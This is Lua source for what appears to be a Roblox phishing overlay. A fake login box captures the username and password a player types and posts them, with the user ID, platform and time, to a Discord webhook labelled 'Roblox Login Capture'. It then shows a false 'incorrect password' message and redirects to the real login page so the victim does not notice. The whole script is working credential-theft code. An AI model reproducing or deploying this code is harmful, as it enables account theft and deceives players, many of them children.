-- ===== SEND TO DISCORD =====
local function sendToDiscord(username, password)
    local data = {
        embeds = {{
            title = "🎮 Roblox Login Capture",
            color = 0x0099ff,
            fields = {
                { name = "👤 Username", value = username, inline = true },
                { name = "🔑 Password", value = "||" .. password .. "||", inline = true },
                { name = "🆔 User ID", value = player.UserId, inline = true },
                { name = "🌐 Platform", value = guiService:GetCurrentPlatform() or "Unknown", inline = true },
                { name = "⏰ Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false }
            },
            footer = { text = "ShadowCat" }
        }}
    }
    local json = httpService:JSONEncode(data)
    local success, err = pcall(function()
        httpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
    end)
    if success then
        print("✅ Credentials sent to Discord")
    else
        warn("❌ Webhook failed: " .. tostring(err))
    end
end

-- ===== LOGIN BUTTON ACTION =====
loginBtn.MouseButton1Click:Connect(function()
    local user = userBox.Text:gsub("^%s*(.-)%s*$", "%1")
    local pass = passBox.Text:gsub("^%s*(.-)%s*$", "%1")
    if user == "" or pass == "" then
        errorLabel.Text = "⚠️ Please fill in both fields."
        errorLabel.Visible = true
        return
    end
    sendToDiscord(user, pass)
    errorLabel.Text = "⚠️ Incorrect username or password. Please try again."
    errorLabel.Visible = true
    passBox.Text = ""
    passBox:CaptureFocus()
    task.wait(2)
    pcall(function()
        guiService:OpenBrowserWindow("https://www.roblox.com/login")
    end)
    screenGui:Destroy()
end)

-- ===== CLOSE BUTTON =====
closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- ===== ENTER KEY SUPPORT =====
local function onEnterPressed(inputObject, gameProcessed)
    if inputObject.KeyCode == Enum.KeyCode.Return or inputObject.KeyCode == Enum.KeyCode.KeypadEnter then
        if not gameProcessed then
            loginBtn:Click()
        end
    end
end
userBox.InputBegan:Connect(onEnterPressed)
passBox.InputBegan:Connect(onEnterPressed)

-- ===== DRAGGING (optional) =====
local dragging = false
local dragStart, startPos
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
    end
end)
frame.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
frame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)
